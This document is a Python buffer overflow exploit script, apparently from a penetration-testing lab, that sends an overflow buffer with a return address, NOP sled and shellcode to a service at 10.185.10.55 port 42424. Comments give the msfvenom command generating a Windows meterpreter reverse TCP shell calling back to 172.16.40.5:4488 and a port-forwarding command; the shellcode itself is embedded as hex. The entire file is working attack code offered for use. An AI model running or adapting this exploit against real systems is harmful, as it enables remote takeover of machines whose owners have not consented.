import socket

ip = "10.185.10.55"
port = 42424

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.40.5 LPORT=4488 EXITFUNC=thread -b "\x00\x01\x0a" -f c 

#portfwd add -R -L 172.16.40.5 -l 445 -p 4488

prefix = ""
offset = 0
overflow = "A" * 146
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload = ("\xbf\xb4\xb8\x33\xc6\xd9\xe1\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x5e\x83\xed\xfc\x31\x7d\x11\x03\x7d\x11\xe2\x41\x44"
"\xdb\x49\xa9\xb5\x1c\x36\x20\x50\x2d\x64\x56\x10\x1c\xb8"
"\x1d\x74\xad\x33\x73\x6d\xa2\xf4\x39\xab\x8d\x05\x36\xc1"
"\xc5\xc8\x88\x8a\x2a\x4a\x74\xd1\x7e\xac\x45\x1a\x73\xad"
"\x82\xec\xf9\x42\x5e\x64\x53\x8d\xd5\x38\x68\xfa\xe8\x6c"
"\x1b\x44\x92\x09\xdc\x31\x2e\x13\x0d\x32\xe6\x0b\xfd\xce"
"\xae\x0b\xfc\x03\xcb\x85\x8a\x9f\x9a\x24\x8c\x6b\x28\xcc"
"\x73\xba\x61\x12\xb2\x8d\x8c\x3e\x34\xd5\xb6\xde\x42\x2d"
"\xc5\x63\x55\xf6\xb4\xbf\xd0\xe9\x1e\x4b\x42\xce\x9f\x98"
"\x15\x85\x93\x55\x51\xc1\xb7\x68\xb6\x79\xc3\xe1\x39\xae"
"\x42\xb1\x1d\x6a\x0f\x61\x3f\x2b\xf5\xc4\x40\x2b\x51\xb8"
"\xe4\x27\x73\xaf\x99\xc7\x8c\xd0\xc7\x5f\x41\x1d\xf8\x9f"
"\xcd\x16\x8b\xad\x52\x8d\x03\x9e\x1b\x0b\xd3\x97\x0b\xac"
"\x0b\x1f\x5b\x52\xac\x60\x72\x91\xf8\x30\xec\x30\x81\xda"
"\xec\xbd\x54\x76\xe6\x29\xfb\x97\xde\xac\x6b\x9a\x1e\xbe"
"\xe3\x13\xf8\x90\xa3\x73\x54\x51\x14\x34\x04\x39\x7e\xbb"
"\x7b\x59\x81\x11\x14\xf0\x6e\xcc\x4d\x6d\x16\x55\x05\x0c"
"\xd7\x43\x60\x0e\x53\x66\x95\xc1\x94\x03\x85\x36\xc3\xeb"
"\x55\xc7\x66\xec\x3f\xc3\x20\xbb\xd7\xc9\x15\x8b\x78\x31"
"\x70\x8f\x7e\xcd\x05\xa6\xf5\xf8\x93\x86\x61\x05\x74\x07"
"\x71\x53\x1e\x07\x19\x03\x7a\x54\x3c\x4c\x57\xc8\xed\xd9"
"\x58\xb9\x42\x49\x31\x47\xbd\xbd\x9e\xb8\xe8\xbd\xd9\x47"
"\x6f\xea\x41\x20\x8f\xaa\x71\xb0\xe5\x2a\x22\xd8\xf2\x05"
"\xcd\x28\xfb\x8f\x86\x20\x76\x5e\x64\xd0\x87\x4b\x28\x4c"
"\x88\x78\xf1\x7f\xf3\xf1\x06\x80\x04\x18\x63\x80\x05\x24"
"\x95\xbc\xd0\x1d\xe3\x83\xe1\x19\xec\x19\xcf\x57\x85\x87"
"\x9a\xd5\xc8\x37\x71\x19\xf5\xbb\x73\xe2\x02\xa3\xf6\xe7"
"\x4f\x63\xeb\x95\xc0\x06\x0b\x09\xe0\x02")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
